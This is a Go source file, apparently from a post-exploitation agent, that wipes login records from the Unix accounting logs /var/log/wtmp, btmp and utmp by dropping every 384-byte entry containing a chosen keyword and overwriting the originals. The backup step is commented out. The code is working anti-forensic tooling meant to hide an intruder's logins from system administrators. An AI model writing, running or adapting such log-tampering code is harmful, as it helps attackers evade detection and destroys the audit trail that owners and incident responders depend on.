package agent

import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

// CleanAllByKeyword delete any entries containing keyword in ALL known log files
func CleanAllByKeyword(keyword string) (err error) {
	return deleteXtmpEntry(keyword)
}

// deleteXtmpEntry delete a wtmp/utmp/btmp entry containing keyword
func deleteXtmpEntry(keyword string) (err error) {
	delete := func(path string) (err error) {
		var (
			offset      = 0
			newFileData []byte
		)
		xtmpf, err := os.Open(path)
		if err != nil {
			return fmt.Errorf("Failed to open xtmp: %v", err)
		}
		defer xtmpf.Close()
		xmtpData, err := ioutil.ReadFile(path)
		if err != nil {
			return fmt.Errorf("Failed to read xtmp: %v", err)
		}

		// back up xtmp file
		// err = ioutil.WriteFile(path+".bak", xmtpData, 0664)
		// if err != nil {
		// 	return fmt.Errorf("Failed to backup %s: %v", path, err)
		// }

		for offset < len(xmtpData) {
			buf := xmtpData[offset:(offset + 384)]
			if strings.Contains(string(buf), keyword) {
				offset += 384
				continue
			}
			newFileData = append(newFileData, buf...)
			offset += 384
		}

		// save new file as xtmp.tmp, users need to rename it manually, in case the file is corrupted
		newXtmp, err := os.OpenFile(path+".tmp", os.O_CREATE|os.O_RDWR, 0664)
		if err != nil {
			return fmt.Errorf("Failed to open temp xtmp: %v", err)
		}
		defer newXtmp.Close()
		err = os.Rename(path+".tmp", path)
		if err != nil {
			return fmt.Errorf("Failed to replace %s: %v", path, err)
		}

		_, err = newXtmp.Write(newFileData)
		return err
	}

	err = nil
	xtmpFiles := []string{"/var/log/wtmp", "/var/log/btmp", "/var/log/utmp"}
	for _, xtmp := range xtmpFiles {
		if IsFileExist(xtmp) {
			e := delete(xtmp)
			if e != nil {
				if err != nil {
					err = fmt.Errorf("DeleteXtmpEntry: %v, %v", err, e)
				} else {
					err = fmt.Errorf("DeleteXtmpEntry: %v", e)
				}
			}
		}
	}
	return err
}
